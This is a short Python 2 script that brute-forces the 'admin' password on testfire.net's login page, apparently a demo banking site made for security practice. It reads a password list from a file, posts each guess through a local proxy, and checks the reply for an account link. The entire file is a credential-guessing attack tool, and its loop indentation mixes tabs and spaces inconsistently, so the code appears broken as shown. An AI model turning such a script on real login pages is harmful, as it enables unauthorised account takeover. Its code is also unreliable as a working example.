import sys
import requests
from bs4 import BeautifulSoup as BS

proxyDict = {"http"  : "127.0.0.1:8082" }

url = "http://www.testfire.net/bank/login.aspx"

def connect(url,m):
    t = requests.post("http://www.testfire.net/bank/login.aspx", data=m, proxies=proxyDict)
    print t.text
    soup = BS(t.text)
    a=soup.find('a', id="_ctl0__ctl0_Content_AccountLink")
    x = str(a.string)
    print x
    if x == "MY ACCOUNT" :
        print "The password is" + " " + m['passw']
	sys.exit()
    else:
        print "Password %s not working" %m['passw']



def controller():
    m = {}
    f=open('password.txt','r').read().split('\n')
    for line in f:
  	m["uid"] = "admin"
		m["passw"] = str(line)
		m["btnSubmit"] = "Login"
		print m
		connect(url,m)

controller()